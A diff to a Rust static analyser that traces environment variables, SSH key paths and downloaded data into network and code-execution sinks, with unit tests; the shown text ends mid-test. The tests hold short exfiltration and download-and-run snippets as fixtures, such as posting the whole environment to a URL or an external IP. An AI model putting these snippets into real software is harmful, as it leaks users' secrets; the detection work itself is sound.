@@ -9,7 +9,8 @@
 //! in order: an assignment, a mutation (`x.update(..)`, `x[k] = ..`,
 //! `x.k = ..`) or a binding (`with .. as x`, `for x in ..`) passes taint from
 //! its right side to the name on its left, and a later sink reports when its
-//! arguments carry taint. Bundles are left to the proximity chains: a large
+//! arguments carry taint. A name assigned a new value with no taint in it is
+//! clean again. Bundles are left to the proximity chains: a large
 //! or minified file is skipped.
 //!
 //! Calls inside the file are followed through two summaries per function,
@@ -89,6 +90,10 @@ struct SinkFunc {
 /// What the walk knows about the file besides the statements.
 struct Cx<'a> {
     raw_http: bool,
+    /// A call that makes a network client (`https.request(`, `httpx.Client(`)
+    /// and the names bound to one: what a method sink is called on.
+    client: &'a Regex,
+    receivers: Vec<String>,
     net_sink: &'a Regex,
     code_sink: &'a Regex,
     sink_funcs: Vec<SinkFunc>,
@@ -139,13 +144,30 @@ static NET_SINK_JS: LazyLock<Regex> = LazyLock::new(|| {
         .unwrap()
 });
 
-/// `req.write(data)` / `req.end(data)` send only when the file speaks raw HTTP.
+/// A first argument that is a loopback URL written out, the port a number or
+/// one interpolation: `http://127.0.0.1:${port}/hook`. Not a host that only
+/// starts like one (`localhost.example`, `127.0.0.1:80@example`).
+static LOOPBACK: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"^\s*(?:url\s*=\s*)?[fF]?["'`]https?://(?:127\.0\.0\.1|localhost|\[::1\])(?::(?:\d+|\$?\{[^{}]*\}))?(?:[/?"'`]|$)"#)
+        .unwrap()
+});
+
+/// `req.write(data)` / `req.end(data)` send only when the file speaks raw HTTP
+/// and `req` is such a request or socket (`on_client`).
 static RAW_HTTP: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r#"(?:https?\.request|net\.(?:connect|Socket|createConnection)|tls\.connect)\s*\("#)
         .unwrap()
 });
 static STREAM_SINK: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r#"\.(?:write|end)\s*\("#).unwrap());
+/// Python's `.post(` / `.put(` / `.request(` are requests on a client of an
+/// HTTP library, not on a queue (`_QUEUE.put(item)`).
+const METHOD_SINKS: &[&str] = &[".post", ".put", ".request"];
+static HTTP_CLIENT_PY: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?:\b(?:requests|httpx|aiohttp|urllib3|http\.client)\.\w+|\b(?:Session|Client|AsyncClient|ClientSession|HTTPS?Connection|PoolManager))\s*\(").unwrap()
+});
+static IMPORT_AS: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"^\s*import\s+(?:requests|httpx)\s+as\s+(\w+)").unwrap());
 
 /// Not `eval`: Python's runs one expression, and scrapers misuse it to parse
 /// responses (`eval(r.text)`); downloaded code goes through `exec`.
@@ -164,6 +186,21 @@ static INLINE_CODE: LazyLock<Regex> = LazyLock::new(|| {
         .unwrap()
 });
 
+/// An argument of a process start that is not the command: the options
+/// object of `spawn`, a keyword of `subprocess.run` (but `args=`).
+static OPTION: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"^\s*(?:\{|[A-Za-z_]\w*\s*=[^=])").unwrap());
+static INSTALLER: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"\b(?:npm|pnpm|yarn|bun|npx|pip3?|pipx|uv)\b").unwrap());
+/// The version in `name@${v}` / `name=={v}`.
+static PACKAGE_VERSION: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?:@|==)\$?\{[^{}]*\}").unwrap());
+/// After a response or the call that fetched it: its status, not its body
+/// (`r.status < 500`, `(await fetch(u)).ok`).
+static STATUS: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^[\s)]*\??\.(?:status|statusCode|status_code|statusText|ok|returncode)\b").unwrap()
+});
+
 /// A call whose value is the output of the command it is given.
 static RUNS_COMMAND: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?:subprocess\.\w+|os\.popen|getoutput|execSync|spawnSync|execFileSync|(?:^|[^\w.])(?:exec|run|popen|check_output))\s*\(").unwrap()
@@ -171,8 +208,7 @@ static RUNS_COMMAND: LazyLock<Regex> = LazyLock::new(|| {
 
 static STARTS_PROCESS: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"(?:Popen|subprocess\.\w+|spawn\w*|fork|exec\w*)\s*\(").unwrap());
-static CHILD_ENV: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"\benv\s*[=:]\s*(?:\{[^{}]*\}|[\w.]+)").unwrap());
+static CHILD_ENV: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\benv\s*[=:]\s*").unwrap());
 
 static WITH_AS: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?:^|,)\s*(?:async\s+)?(?:with\s+)?(.+?)\s+as\s+([A-Za-z_]\w*)").unwrap()
@@ -189,10 +225,14 @@ static IDENT: LazyLock<Regex> =
 
 /// The text before a JS block's `{` when it is a named function: `function
 /// f(a)`, `f = (a) =>`, `f: function (a)`, `f = a =>`, a method `f(a)`.
-/// Groups: (1,2), (3,4), (5,6), (7,8) are name and parameters.
+/// Groups: (1,2), (3,4), (5,6), (7,8) are name and parameters; a default
+/// value may hold one pair of parentheses (`now = Date.now()`).
 static JS_FUNC: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?:function\s*\*?\s*([\w$]+)\s*\(([^()]*)\)|([\w$]+)\s*[:=]\s*(?:async\s*)?(?:function\s*\*?\s*[\w$]*\s*)?\(([^()]*)\)|([\w$]+)\s*[:=]\s*(?:async\s+)?([\w$]+)\s*=>|^\s*(?:(?:async|static|export|default)\s+)*([\w$]+)\s*\(([^()]*)\))(?:\s*:\s*[\w$<>\[\]|., ]+)?\s*(?:=>)?\s*$").unwrap()
+    Regex::new(r"(?:function\s*\*?\s*([\w$]+)\s*\(((?:[^()]|\([^()]*\))*)\)|([\w$]+)\s*[:=]\s*(?:async\s*)?(?:function\s*\*?\s*[\w$]*\s*)?\(((?:[^()]|\([^()]*\))*)\)|([\w$]+)\s*[:=]\s*(?:async\s+)?([\w$]+)\s*=>|^\s*(?:(?:async|static|export|default)\s+)*([\w$]+)\s*\(((?:[^()]|\([^()]*\))*)\))(?:\s*:\s*[\w$<>\[\]|., ]+)?\s*(?:=>)?\s*$").unwrap()
 });
+/// `onText = () =>`: an arrow function that is a default value.
+static DEFAULT_ARROW: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"[^=!<>]=\s*(?:async\s*)?(?:\([^()]*\)|[\w$]+)\s*=>$").unwrap());
 /// TypeScript's output for an async arrow function: `f = (a, b) =>
 /// __awaiter(void 0, void 0, void 0, function* ()`. With default values the
 /// generator carries the real parameter names (group 3).
@@ -231,8 +271,25 @@ pub fn flows(rel_path: &str, content: &str) -> Vec<RuleMatch> {
         return Vec::new();
     }
     let (stmts, funcs) = statements(content, python);
+    let client: &Regex = if python { &HTTP_CLIENT_PY } else { &RAW_HTTP };
+    // `req = https.request(o)`, `with httpx.Client() as c`, `import requests
+    // as r`.
+    let receivers = stmts
+        .iter()
+        .flat_map(|s| {
+            let alias = IMPORT_AS.captures(&s.text).map(|c| c[1].to_string());
+            let bound = bindings(&s.text).into_iter();
+            let bound = bound.filter(|(_, rhs, ..)| client.is_match(rhs));
+            bound
+                .flat_map(|(names, ..)| names)
+                .chain(alias)
+                .collect::<Vec<_>>()
+        })
+        .collect();
     let mut cx = Cx {
         raw_http: js && RAW_HTTP.is_match(content),
+        client,
+        receivers,
         net_sink: if python { &NET_SINK_PY } else { &NET_SINK_JS },
         code_sink: if python { &CODE_SINK_PY } else { &CODE_SINK_JS },
         sink_funcs: Vec::new(),
@@ -276,16 +333,28 @@ fn walk<'a>(
             };
             let mut found = false;
             for m in sink.find_iter(&s.text) {
-                let args = call_args(&s.text, m.end() - 1);
-                // A process started with downloaded data among its arguments
-                // (a version, a URL, a pid) runs that program, not the data.
-                if name == DOWNLOAD_EXECUTE
-                    && (m.as_str().contains("subprocess") || m.as_str().contains("spawn"))
-                    && !INLINE_CODE.is_match(args)
+                if METHOD_SINKS.iter().any(|p| m.as_str().starts_with(p))
+                    && !on_client(&s.text, m.start(), cx)
                 {
                     continue;
                 }
-                if let Some((_, origin)) = carried(args, s.line, taint, Some(kind), cx) {
+                let args = call_args(&s.text, m.end() - 1);
+                // A request to this machine talks to a local daemon.
+                if kind == Kind::Secret && LOOPBACK.is_match(args) {
+                    continue;
+                }
+                // A process started with downloaded data among its arguments
+                // (a version, a URL, a pid) runs that program, not the data.
+                let starts = m.as_str().contains("subprocess") || m.as_str().contains("spawn");
+                if name == DOWNLOAD_EXECUTE && starts && !INLINE_CODE.is_match(args) {
+                    continue;
+                }
+                let args = if name == DOWNLOAD_EXECUTE {
+                    what_runs(args, starts)
+                } else {
+                    args.to_string()
+                };
+                if let Some((_, origin)) = carried(&args, s.line, taint, Some(kind), cx) {
                     hit(origin, m.as_str());
                     found = true;
                     break;
@@ -293,6 +362,9 @@ fn walk<'a>(
             }
             if cx.raw_http && kind == Kind::Secret && !found {
                 for m in STREAM_SINK.find_iter(&s.text) {
+                    if !on_client(&s.text, m.start(), cx) {
+                        continue;
+                    }
                     let args = call_args(&s.text, m.end() - 1);
                     if let Some((_, origin)) = carried(args, s.line, taint, Some(kind), cx) {
                         hit(origin, m.as_str());
@@ -331,13 +403,13 @@ fn walk<'a>(
                 returned = carried(value, s.line, taint, None, cx);
             }
         }
-        for (targets, rhs, element) in bindings(&s.text) {
+        for (targets, rhs, element, plain) in bindings(&s.text) {
             // The environment handed to a child process is not in the handle
             // that comes back (`info['popen'] = Popen(cmd, env=env)`, nbclassic).
             let rhs = if STARTS_PROCESS.is_match(rhs) {
-                CHILD_ENV.replace_all(rhs, "")
+                without_child_env(rhs)
             } else {
-                rhs.into()
+                rhs.to_string()
             };
             if let Some((kind, mut origin)) = carried(&rhs, s.line, taint, None, cx) {
                 // One item of the environment is not the mapping.
@@ -345,10 +417,86 @@ fn walk<'a>(
                 for t in targets {
                     taint.entry(t).or_insert((kind, origin.clone()));
                 }
+            } else if plain && !idents(&rhs).iter().any(|n| taint.contains_key(n)) {
+                // A new value with nothing tainted in it: `env = {**os.environ,
+                // 'T': t}` for a child process, then in another method `env =
+                // pool.build_envelope(obj)` and `sock.sendall(json.dumps(env))`.
+                // shortcut: no branches, so `x = {}` in an `except` clears what
+                // the `try` put in `x`; needs scopes (see the module header).
+                for t in targets {
+                    taint.remove(&t);
+                }
             }
         }
     }
     (hits, returned)
+}
+
+/// The part of a code sink's arguments that is run. Of a process start
+/// (`starts`) the program and its arguments, not the options: `{ input: body,
+/// env, stdio }`, `input=r.text` are data for it. And not a version put in an
+/// install command, which `shell: true` made look like a shell script:
+/// `spawnSync('npm', ['install', '-g', `pkg@${latest}`], { shell: true })`
+/// is a self-update.
+fn what_runs(args: &str, starts: bool) -> String {
+    let option = |a: &&str| OPTION.is_match(a) && !a.trim_start().starts_with("args");
+    let mut run = args.to_string();
+    if starts {
+        let command = split_args(args).into_iter().filter(|a| !option(a));
+        run = command.collect::<Vec<_>>().join(",");
+    }
+    if INSTALLER.is_match(&run) {
+        run = PACKAGE_VERSION.replace_all(&run, "").into_owned();
+    }
+    run
+}
+
+/// `rhs` without the `env=` / `env:` arguments of the process it starts, each
+/// up to the comma or bracket that ends it: `env={**os.environ, **(env or
+/// {})}` has braces inside.
+fn without_child_env(rhs: &str) -> String {
+    let mut out = String::new();
+    let mut rest = rhs;
+    while let Some(m) = CHILD_ENV.find(rest) {
+        out.push_str(&rest[..m.start()]);
+        rest = &rest[m.end()..];
+        let mut depth = 0;
+        let ends = |c: char| {
+            match c {
+                '(' | '[' | '{' => depth += 1,
+                ')' | ']' | '}' => depth -= 1,
+                _ => {}
+            }
+            depth < 0 || (depth == 0 && c == ',')
+        };
+        rest = &rest[rest.find(ends).unwrap_or(rest.len())..];
+    }
+    out + rest
+}
+
+/// Whether the method at byte `at` (its `.`) is called on a network client:
+/// the library, a name bound to a client of it, or the call that makes one
+/// (`https.request(o).end(body)`). `process.stdout.write(text)` and
+/// `res.end(text)` send nothing out.
+/// shortcut: a client that arrives as a parameter or from a helper of the
+/// file is not seen; follow the bindings if a stealer passes its socket around.
+fn on_client(text: &str, at: usize, cx: &Cx) -> bool {
+    let head = text[..at].trim_end();
+    let start = head
+        .rfind(|c: char| !(c.is_alphanumeric() || "_$.".contains(c)))
+        .map_or(0, |p| p + 1);
+    let name = &head[start..];
+    if name.is_empty() {
+        // After a callback's block the call began in an earlier statement
+        // (`https.request(o, () => {…}).end(body)`): not known, so it counts.
+        let cut = head.matches(')').count() > head.matches('(').count();
+        return head.ends_with(')') && (cut || cx.client.is_match(head));
+    }
+    let bound = |r: &String| {
+        name.strip_prefix(r.as_str())
+            .is_some_and(|rest| rest.is_empty() || rest.starts_with('.'))
+    };
+    ["requests", "httpx"].contains(&name) || cx.receivers.iter().any(bound)
 }
 
 /// Fills `cx.sink_funcs` and `cx.returns`: each function's statements are
@@ -521,7 +669,12 @@ fn carried(
     if want.is_none() {
         // A call in the code, or `curl` / `wget` in a string. A `fetch(` inside
         // a string is a script for another process (`node -e`), not a call.
-        let call = DOWNLOAD_SRC.find(&code).map(|m| (m.as_str(), true));
+        let status = |m: &regex::Match| {
+            let close = m.end() + call_args(&code, m.end() - 1).len();
+            m.as_str().ends_with('(') && STATUS.is_match(code.get(close..).unwrap_or_default())
+        };
+        let call = DOWNLOAD_SRC.find(&code).filter(|m| !status(m));
+        let call = call.map(|m| (m.as_str(), true));
         let found = call.or_else(|| {
             let m = DOWNLOAD_SRC.find(text)?;
             let word = m
@@ -552,6 +705,15 @@ fn carried(
         .collect();
     found.extend(found_in.iter().filter_map(|(name, mention, at)| {
         let (kind, origin) = taint.get(name)?;
+        if *kind == Kind::Download && STATUS.is_match(&code[at + name.len()..]) {
+            return None;
+        }
+        // A path derived from the `.ssh` directory or a key's (`ssh_dir /
+        // "config"`, `open(key + ".pub")`); a sink is not where it is built.
+        let what = origin.what.to_ascii_lowercase();
+        if want.is_none() && (what.contains(".ssh") || what.starts_with("id_")) && not_a_key(text) {
+            return None;
+        }
         let mut origin = origin.clone();
         if origin.alias {
             origin.alias = match (*mention, around(&code, *at, &cx.passers)) {
@@ -626,6 +788,15 @@ enum Around {
     Opaque,
 }
 
+/// What follows a value when one field of it is read: `[k]`, `?.k`, `.k`,
+/// `.get(k)`; not a method call (`.items()`).
+static FIELD_READ: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"^\s*(?:\[|\?\.|\.(?:get|pop|setdefault|hasOwnProperty)\s*\(|\.[\w$]+\s*(?:[^\w$(\s]|$))",
+    )
+    .unwrap()
+});
+
 fn around(code: &str, at: usize, passers: &[String]) -> Around {
     let bytes = code.as_bytes();
     let mut depth = 0;
@@ -637,6 +808,10 @@ fn around(code: &str, at: usize, passers: &[String]) -> Around {
             b'(' | b'[' | b'{' if depth > 0 => depth -= 1,
             b'(' => {
                 let head = code[..i].trim_end();
+                // `PROVIDERS[provider](env)`: a call, not a grouping.
+                if head.ends_with([']', ')']) {
+                    return Around::Opaque;
+                }
                 let start = head
                     .rfind(|c: char| !(c.is_alphanumeric() || "_$.".contains(c)))
                     .map_or(0, |p| p + 1);
@@ -645,6 +820,12 @@ fn around(code: &str, at: usize, passers: &[String]) -> Around {
                 // value: look further out.
                 if callee.is_empty() || NOT_FUNCTIONS.contains(&callee) || COPIERS.contains(&callee)
                 {
+                    // `(options.env ?? process.env).NAME`: one variable of
+                    // whichever mapping the group gives.
+                    let close = i + call_args(code, i).len() + 2;
+                    if FIELD_READ.is_match(code.get(close..).unwrap_or_default()) {
+                        return Around::Opaque;
+                    }
                     continue;
                 }
                 return if SERIALISERS.contains(&callee) || passers.iter().any(|p| p == callee) {
@@ -659,6 +840,23 @@ fn around(code: &str, at: usize, passers: &[String]) -> Around {
     Around::Top
 }
 
+/// The end of a path in `~/.ssh` that is no secret (`join(dir, "config")`,
+/// `key + ".pub"`, `~/.ssh/known_hosts`): a tool that makes a key and posts
+/// the public half, or reads the host list. A name that is compared, not
+/// read, does not count (`if name != "known_hosts"`).
+static NOT_A_KEY: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?:[\w}]\.pub|\.ssh/config|/known_hosts|/authorized_keys)["'`]|[+,/]\s*["'](?:\.pub|config|known_hosts|authorized_keys)["']\s*(?:[).\]]|$)"#)
+        .unwrap()
+});
+static LISTS_DIR: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?:listdir|readdir\w*|scandir|iterdir|glob|walk)\s*\(").unwrap());
+
+/// The statement reads one of the files in `NOT_A_KEY` and does not list the
+/// directory, where such a name is one to leave out.
+fn not_a_key(text: &str) -> bool {
+    NOT_A_KEY.is_match(text) && !LISTS_DIR.is_match(text)
+}
+
 /// A stealer-only path in the text, strings included.
 fn secret_path(text: &str) -> Option<String> {
     // `~/.ssh/id_rsa.pub` is a public key: sent to be signed (unskript).
@@ -667,6 +865,7 @@ fn secret_path(text: &str) -> Option<String> {
         .find(|m| {
             let quoted = m.as_str().starts_with(['"', '\'']);
             !(quoted && (text.contains(".pub\"") || text.contains(".pub'")))
+                && !(m.as_str().contains(".ssh") && not_a_key(text))
                 && !text[m.end()..]
                     .split(['"', '\'', '`'])
                     .next()
@@ -676,9 +875,19 @@ fn secret_path(text: &str) -> Option<String> {
         .map(|m| m.as_str().to_string())
 }
 
-/// `(targets, right side, element)` for each binding in one statement;
-/// `element`: the targets are items of the right side (`for x in xs`), not it.
-fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool)> {
+/// The left side of an assignment that gives one name a new value (`x`,
+/// `const x`, `self.x`, `x: Dict`), not `x +`, `x[k]`, `x.k` or `a, b`.
+static PLAIN_LHS: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"^\s*(?:(?:export|const|let|var)\s+)*(?:self\.|this\.)?[A-Za-z_$][\w$]*\s*(?::[^=]*)?$",
+    )
+    .unwrap()
+});
+
+/// `(targets, right side, element, plain)` for each binding in one statement;
+/// `element`: the targets are items of the right side (`for x in xs`), not it;
+/// `plain`: the target is a name given a new value (see `PLAIN_LHS`).
+fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool, bool)> {
     let mut out = Vec::new();
     if let Some((lhs, rhs)) = split_assignment(text) {
         // `const { HOME, CI } = process.env` picks variables, not the lot.
@@ -687,13 +896,18 @@ fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool)> {
             .trim_start_matches(|c: char| c.is_alphabetic() || c.is_whitespace())
             .starts_with('{');
         if !(picks && ["process.env", "os.environ"].contains(&rhs.trim().trim_end_matches(';'))) {
-            out.push((targets(lhs), rhs, false));
+            out.push((targets(lhs), rhs, false, PLAIN_LHS.is_match(lhs)));
         }
     }
     let head = text.trim_start();
     if head.starts_with("with ") || head.starts_with("async with ") {
         for c in WITH_AS.captures_iter(text) {
-            out.push((vec![c[2].to_string()], c.get(1).unwrap().as_str(), false));
+            out.push((
+                vec![c[2].to_string()],
+                c.get(1).unwrap().as_str(),
+                false,
+                false,
+            ));
         }
     }
     if let Some(c) = FOR_IN.captures(text) {
@@ -701,10 +915,16 @@ fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool)> {
             targets(c.get(1).unwrap().as_str()),
             c.get(2).unwrap().as_str(),
             true,
+            false,
         ));
     }
     if let Some(c) = THEN.captures(text) {
-        out.push((vec![c[2].to_string()], c.get(1).unwrap().as_str(), false));
+        out.push((
+            vec![c[2].to_string()],
+            c.get(1).unwrap().as_str(),
+            false,
+            false,
+        ));
     }
     for c in MUTATE.captures_iter(text) {
         let target = base_name(&c[1]);
@@ -712,6 +932,7 @@ fn bindings(text: &str) -> Vec<(Vec<String>, &str, bool)> {
             out.push((
                 vec![target],
                 call_args(text, c.get(0).unwrap().end() - 1),
+                false,
                 false,
             ));
         }
@@ -791,7 +1012,8 @@ enum Mention {
     Bare,
     /// A method called on it (`x.encode()`, `x.items()`): something derived.
     Method,
-    /// One field of it (`x.name`, `x[k]`, `x?.name`, `x.get(k)`).
+    /// One field of it (`x.name`, `x[k]`, `x?.name`, `x.get(k)`), a test for
+    /// one (`k in x`), or a call of it (`x()`).
     Pick,
 }
 
@@ -843,6 +1065,9 @@ fn mentions(code: &str) -> Vec<(String, Mention, usize)> {
             Mention::Pick
         }
         Some(_) => Mention::Method,
+        // `configDir()` after `configDir = (env = process.env) => root(env)`:
+        // a name that is called is a function, not the value.
+        None if after.starts_with('(') => Mention::Pick,
         None => Mention::Bare,
     };
     IDENT
@@ -1067,11 +1292,13 @@ fn js_function(before: &str) -> Option<(String, Vec<String>)> {
 /// object literal. `depth`: brackets open in the statement; inside them a
 /// `{` after `=` is a default value (`function f(a = {}, env = process.env)`),
 /// which used to cut the header in two and bind `env` to the environment.
+/// So is the `{}` of `onText = () => {}` there; a callback's `=> {` among the
+/// arguments of a call still opens a block.
 fn is_block(before: &str, depth: i32) -> bool {
     let t = before.trim_end();
     t.is_empty()
         || t.ends_with(')')
-        || t.ends_with("=>")
+        || (t.ends_with("=>") && !(depth > 0 && DEFAULT_ARROW.is_match(t)))
         || ["else", "try", "finally", "do"]
             .iter()
             .any(|k| t.ends_with(k))
@@ -1234,6 +1461,22 @@ def main():
             "{:?}",
             flows("usage.js", default)
         );
+        // A callback as a default value used to end the header there and
+        // bind the next parameter to the environment.
+        let arrow = "async function chat({ model, onText = () => {}, maxOutputTokens = 8192, env = process.env }) {\n  const body = { max: maxOutputTokens };\n  await fetch(u, { method: 'POST', body: JSON.stringify(body) });\n}\n";
+        assert!(
+            names("chat.js", arrow).is_empty(),
+            "{:?}",
+            flows("chat.js", arrow)
+        );
+        let parens = "function run(opts, now = Date.now(), env = process.env) {\n}\n";
+        assert_eq!(
+            statements(parens, false).1[0].params,
+            ["opts", "now", "env"]
+        );
+        // A callback among the arguments of a call is still a block.
+        let callback = "async function chat({ onText = () => {}, env = process.env }) {\n  queue.run(1, async () => {\n    const all = process.env;\n    await fetch(u, { method: 'POST', body: JSON.stringify(all) });\n  });\n}\n";
+        assert_eq!(names("chat.js", callback), vec![CREDENTIAL_EXFIL]);
         let py = "def send(data):\n    requests.post(URL, json=data)\n\ndef debug(data):\n    print(data)\n\n\
                   send({'user': os.environ.get('USER')})\ndebug(os.environ)\n";
         assert!(names("a.py", py).is_empty(), "{:?}", flows("a.py", py));
@@ -1272,6 +1515,190 @@ def main():
         }
         let run = "const code = await (await fetch(u)).text();\nspawn('node', ['-e', code]);\n";
         assert_eq!(names("f.js", run), vec![DOWNLOAD_EXECUTE]);
+    }
+
+    /// Shapes from the releases of 2026-11-21, one test per narrowing.
+    #[test]
+    fn a_call_through_a_subscript_is_a_call() {
+        let py = "client = httpx.Client()\nenv = os.environ\nheaders = PROVIDERS[provider](env)\nclient.post(listing, headers=headers)\n";
+        assert!(
+            names("models.py", py).is_empty(),
+            "{:?}",
+            flows("models.py", py)
+        );
+        let js = "const headers = PROVIDERS[provider](process.env);\nawait fetch(listing, { method: 'POST', headers });\n";
+        assert!(
+            names("models.js", js).is_empty(),
+            "{:?}",
+            flows("models.js", js)
+        );
+        let copy = "env = (os.environ)\nrequests.post(u, json=dict(env))\n";
+        assert_eq!(names("a.py", copy), vec![CREDENTIAL_EXFIL]);
+    }
+
+    #[test]
+    fn a_field_of_a_group_and_a_called_name_are_not_the_environment() {
+        for (path, src) in [
+            ("a.py", "key = (os.environ if environ is None else environ).get(k)\nrequests.post(u, json={'k': key})\n"),
+            ("b.js", "const name = (options.env ?? process.env).NAME;\nfetch(u, { method: 'POST', body: JSON.stringify({ name }) });\n"),
+            ("c.js", "export const configDir = (env = process.env) => configRoot(env);\nconst dir = configDir();\nfetch(u, { method: 'POST', body: JSON.stringify({ dir, again: configDir() }) });\n"),
+        ] {
+            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
+        }
+        for (path, src) in [
+            ("d.py", "env = (os.environ if environ is None else environ)\nrequests.post(u, json=dict(env))\n"),
+            ("e.js", "const env = (options.env ?? process.env);\nfetch(u, { method: 'POST', body: JSON.stringify(env) });\n"),
+            ("f.js", "fetch(u, { method: 'POST', body: JSON.stringify(Object.entries(options.env ?? process.env).map(([k, v]) => k + v)) });\n"),
+        ] {
+            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
+        }
+    }
+
+    #[test]
+    fn a_method_sink_needs_a_network_client() {
+        let queue = "env = dict(os.environ)\n_QUEUE.put(env)\nprocess.put(json.dumps(env))\n";
+        assert!(
+            names("worker.py", queue).is_empty(),
+            "{:?}",
+            flows("worker.py", queue)
+        );
+        let streams = "const req = http.request(o);\nreq.end();\nprocess.stdout.write(JSON.stringify(process.env));\nres.end(JSON.stringify(process.env));\nlog.write(JSON.stringify(process.env));\n";
+        assert!(
+            names("debug.js", streams).is_empty(),
+            "{:?}",
+            flows("debug.js", streams)
+        );
+        for (path, src) in [
+            ("a.js", "const req = https.request(o);\nreq.write(JSON.stringify(process.env));\nreq.end();\n"),
+            ("b.js", "https.request(o, () => {})\n  .end(JSON.stringify(process.env));\n"),
+            ("c.js", "const sock = new net.Socket();\nsock.connect(443, HOST, () => sock.write(JSON.stringify(process.env)));\n"),
+            ("d.py", "session = requests.Session()\nsession.post(u, json=dict(os.environ))\n"),
+            ("e.py", "class C:\n    def __init__(self):\n        self.http = httpx.Client()\n\n    def send(self):\n        self.http.put(u, json=dict(os.environ))\n"),
+            ("f.py", "async with aiohttp.ClientSession() as s:\n    await s.post(u, json=dict(os.environ))\n"),
+            ("g.py", "import requests as r\nr.post(u, json=dict(os.environ))\n"),
+            ("h.py", "conn = http.client.HTTPSConnection(HOST)\nconn.request('POST', '/', json.dumps(dict(os.environ)))\n"),
+            ("i.py", "httpx.post(u, json=dict(os.environ))\n"),
+        ] {
+            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
+        }
+    }
+
+    #[test]
+    fn the_environment_of_a_child_process_is_not_in_its_result() {
+        for (path, src) in [
+            ("a.py", "proc = subprocess.run(cmd, env={**os.environ, **(env or {})})\nrequests.post(u, json={'out': proc.stdout})\n"),
+            ("b.py", "proc = subprocess.run(cmd, env={**{k: v for k, v in os.environ.items()}, **(env or {})}, check=True)\nrequests.post(u, json={'out': proc.stdout})\n"),
+            ("c.py", "base = {k: v for k, v in os.environ.items()}\nproc = subprocess.Popen(cmd, env={**base, **(extra or {})})\nrequests.post(u, json={'pid': proc.pid})\n"),
+            ("d.js", "const child = spawn(cmd, args, { env: { ...Object.fromEntries(Object.entries(process.env).filter(keep)), ...(extra || {}) }, stdio: 'pipe' });\nfetch(u, { method: 'POST', body: JSON.stringify({ pid: child.pid }) });\n"),
+        ] {
+            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
+        }
+        let copy = "d = dict(os.environ)\nrequests.post(u, json=d)\n";
+        assert_eq!(names("e.py", copy), vec![CREDENTIAL_EXFIL]);
+        // What stands around the argument is still read.
+        let curl = "r = subprocess.run(['curl', '-s', URL], env={**os.environ, **(env or {})}, capture_output=True)\nsubprocess.run(['node', '-e', r.stdout])\n";
+        assert_eq!(names("f.py", curl), vec![DOWNLOAD_EXECUTE]);
+        let input = "r = subprocess.run(cmd, env={**base, **(env or {})}, input=json.dumps(dict(os.environ)))\nrequests.post(u, data=r.stdout)\n";
+        assert_eq!(names("g.py", input), vec![CREDENTIAL_EXFIL]);
+    }
+
+    #[test]
+    fn a_name_given_a_new_value_is_clean_again() {
+        let py = "def start(self):\n    env = {**os.environ, 'T': t}\n    subprocess.Popen(cmd, env=env)\n\ndef send(self, obj):\n    env = pool.build_envelope(obj)\n    sock.sendall(json.dumps(env))\n";
+        assert!(
+            names("pool.py", py).is_empty(),
+            "{:?}",
+            flows("pool.py", py)
+        );
+        let js = "const env = { ...process.env, CI: '1' };\nspawn('npm', ['test'], { env });\nfunction send(msg) {\n  const env = envelope(msg);\n  fetch(u, { method: 'POST', body: JSON.stringify(env) });\n}\n";
+        assert!(
+            names("pool.js", js).is_empty(),
+            "{:?}",
+            flows("pool.js", js)
+        );
+        // Derived from itself or from another tainted name, added to, or
+        // changed in place: still the value.
+        for (path, src) in [
+            ("a.py", "env = dict(os.environ)\nenv = json.dumps(env)\nrequests.post(u, data=env)\n"),
+            ("b.py", "env = os.environ\nenv = scrub(env)\nrequests.post(u, json=dict(env))\n"),
+            ("c.py", "data = {}\ndata = dict(os.environ)\nrequests.post(u, json=data)\n"),
+            ("d.py", "body = ''\nbody += json.dumps(dict(os.environ))\nbody += '\\n'\nrequests.post(u, data=body)\n"),
+            ("e.py", "d = dict(os.environ)\nd['host'] = name\nd.update(extra)\nrequests.post(u, json=d)\n"),
+            ("f.js", "let data = JSON.stringify(process.env);\nconst key = makeKey();\ndata = encrypt(data, key);\nfetch(u, { method: 'POST', body: data });\n"),
+            ("g.js", "function send(data) {\n  data = pack(data);\n  fetch(u, { method: 'POST', body: data });\n}\nsend(process.env);\n"),
+        ] {
+            assert_eq!(names(path, src), vec![CREDENTIAL_EXFIL], "{path}");
+        }
+    }
+
+    #[test]
+    fn a_request_to_a_loopback_url_is_local() {
+        for (path, src) in [
+            ("a.js", "await fetch('http://127.0.0.1:4317/hook', { method: 'POST', body: JSON.stringify(process.env) });\n"),
+            ("b.js", "await axios.post(`http://localhost:${port}/hook`, process.env);\n"),
+            ("c.py", "requests.post(f\"http://[::1]:{port}/x\", json=dict(os.environ))\n"),
+        ] {
+            assert!(names(path, src).is_empty(), "{path}: {:?}", flows(path, src));
+        }
+        for (path, src) in [
+            ("d.js", "await fetch('http://203.0.113.5:4317/hook', { method: 'POST', body: JSON.stringify(process.env) });\n"),
